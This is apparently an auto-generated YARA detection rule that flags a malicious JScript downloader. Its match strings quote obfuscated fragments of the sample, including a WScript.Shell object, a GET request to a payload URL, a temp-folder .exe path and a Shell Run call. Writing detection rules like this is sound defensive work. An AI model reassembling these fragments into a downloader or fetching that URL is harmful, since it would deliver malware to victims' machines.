rule sig_20160330_6e87f428fe3b464699318e83b3498f33 {
  meta:
    description = "datamaliciousorder - file 20160330_6e87f428fe3b464699318e83b3498f33.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "37fe10416c4bcff7c9b9c5dec3df8ea82fe58a1ca6773c3dee36e11e565a74c1"

  strings:
    $s1  = "var _OO0 = function _DC() {return WScript[_J](\"WScript\"+\".Shell\");}(), _QZ = 11;" fullword ascii
    $s2  = "function _O(_KT, _RA0){_A = _A * 1; return _KT - _RA0;};" fullword ascii
    $s3  = "if (_YQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _SQ(){return _U + \"\";};" fullword ascii
    $s5  = "_YQ[_HS](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s6  = "function _CN() {return _OO0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VJ5hoVv4n.ex\" + \"e\";};" fullword ascii
    $s7  = "function _OO(_ZR){_OO0[\"Run\"](_ZR, _A, _A);};" fullword ascii
    $s8  = "function _Y() {return ((_LB == true) && (_LB == _ZY)) ? 1 : _A;};" fullword ascii
    $s9  = "function _F()" fullword ascii
    $s10 = "var _F2 = new this[\"Date\"]();" fullword ascii
    $s11 = "return _O(_ZP0, _J0);" fullword ascii
    $s12 = "function _RA(_G) {var _M0 = (1, 2, 3, 4, 5, _G); return _M0;};" fullword ascii
    $s13 = " while (_X){" fullword ascii
    $s14 = "function _HT(){return 22;};" fullword ascii
    $s15 = "function _E(){return _J;};" fullword ascii
    $s16 = "var _ZY = false;" fullword ascii
    $s17 = "_LB = true; " fullword ascii
    $s18 = "var _CN0 = false;" fullword ascii
    $s19 = "_ZY = true; " fullword ascii
    $s20 = "var _LB = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}